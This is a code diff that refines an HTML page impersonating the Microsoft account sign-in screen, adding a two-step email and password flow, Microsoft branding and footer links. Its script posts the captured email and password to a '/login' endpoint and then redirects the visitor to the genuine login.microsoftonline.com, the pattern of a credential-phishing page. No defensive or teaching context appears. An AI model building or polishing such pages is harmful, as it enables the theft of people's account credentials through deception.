@@ -8,14 +8,16 @@
     <style>
         body {
             font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga', 'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI', 'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Cambria Math', sans-serif;
-            background: #f0f2f5;
+            background-color: #f0f2f5;
             background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49_7916a8b4b1a50a498e72.jpg');
             background-size: cover;
+            background-position: center;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
         .card {
             background: #fff;
@@ -23,6 +25,7 @@
             padding: 44px;
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
             position: relative;
+            box-sizing: border-box;
         }
         .logo {
             height: 24px;
@@ -33,6 +36,7 @@
             font-weight: 600;
             margin: 0 0 10px;
             color: #1b1b1b;
+            line-height: 1.2;
         }
         .input-group {
             margin-top: 20px;
@@ -46,13 +50,17 @@
             font-size: 15px;
             box-sizing: border-box;
             outline: none;
+            color: #1b1b1b;
         }
         input:focus {
             border-color: #0067b8;
             border-bottom-width: 2px;
         }
+        input::placeholder {
+            color: #666;
+        }
         .actions {
-            margin-top: 16px;
+            margin-top: 30px;
             display: flex;
             justify-content: flex-end;
         }
@@ -64,6 +72,8 @@
             font-size: 15px;
             cursor: pointer;
             min-width: 108px;
+            font-weight: 600;
+            transition: background-color 0.2s;
         }
         .next-btn:hover {
             background-color: #005da6;
@@ -77,47 +87,168 @@
             text-decoration: none;
         }
         .links a:hover {
+            color: #666;
             text-decoration: underline;
+        }
+        .hidden {
+            display: none;
+        }
+        .user-identity {
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+            margin-bottom: 20px;
+            color: #1b1b1b;
+        }
+        .back-arrow {
+            margin-right: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            color: #1b1b1b;
+            text-decoration: none;
+        }
+        .back-arrow:hover {
+            background-color: #e1e1e1;
+            border-radius: 50%;
+        }
+        
+        /* Footer */
+        .footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            text-align: right;
+            padding: 10px 20px;
+            box-sizing: border-box;
+            background: rgba(255,255,255,0.6);
+            font-size: 12px;
+        }
+        .footer a {
+            color: #000;
+            text-decoration: none;
+            margin-left: 20px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                background: #fff;
+            }
+            .card {
+                box-shadow: none;
+                width: 100%;
+                height: 100%;
+                padding: 24px;
+            }
+            .footer {
+                display: none;
+            }
         }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
-        <h1>Sign in</h1>
         
-        <form id="login-form" onsubmit="handleLogin(event)">
+        <div id="step-1">
+            <h1>Sign in</h1>
+            
             <div class="input-group">
-                <input type="text" id="email" name="email" placeholder="Email, phone, or Skype" required>
-            </div>
-            <div class="input-group">
-                <input type="password" id="password" name="password" placeholder="Password" required>
+                <input type="email" id="email-input" placeholder="Email, phone, or Skype" required>
             </div>
             
             <div class="links">
                 No account? <a href="#">Create one!</a>
             </div>
+            <div class="links" style="margin-top: 10px;">
+                <a href="#">Can’t access your account?</a>
+            </div>
             
             <div class="actions">
-                <button type="submit" class="next-btn">Next</button>
+                <button class="next-btn" onclick="goToStep2()">Next</button>
             </div>
-        </form>
+        </div>
+
+        <div id="step-2" class="hidden">
+            <div class="user-identity">
+                <span class="back-arrow" onclick="goToStep1()">&#8592;</span>
+                <span id="user-email-display">user@example.com</span>
+            </div>
+            
+            <h1 style="font-size: 24px; margin-bottom: 20px;">Enter password</h1>
+            
+            <div class="input-group">
+                <input type="password" id="password-input" placeholder="Password" required>
+            </div>
+            
+            <div class="links">
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <div class="actions">
+                <button class="next-btn" onclick="submitLogin()">Sign in</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <a href="#">...</a>
     </div>
 
     <script>
-        function handleLogin(event) {
-            event.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        function goToStep2() {
+            const email = document.getElementById('email-input').value;
+            if (!email) {
+                document.getElementById('email-input').focus();
+                document.getElementById('email-input').style.borderColor = '#d93025';
+                return;
+            }
+            document.getElementById('user-email-display').innerText = email;
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+            document.getElementById('password-input').focus();
+        }
+
+        function goToStep1() {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-1').classList.remove('hidden');
+        }
+
+        function submitLogin() {
+            const email = document.getElementById('email-input').value;
+            const password = document.getElementById('password-input').value;
             
+            if (!password) {
+                document.getElementById('password-input').focus();
+                document.getElementById('password-input').style.borderColor = '#d93025';
+                return;
+            }
+
             fetch('/login', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({username: email, password: password})
-            }).then(res => {
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            }).then(() => {
                 window.location.href = "https://login.microsoftonline.com/";
             });
         }
+
+        // Allow Enter key
+        document.getElementById('email-input').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') goToStep2();
+        });
+        document.getElementById('password-input').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') submitLogin();
+        });
     </script>
 </body>
 </html>
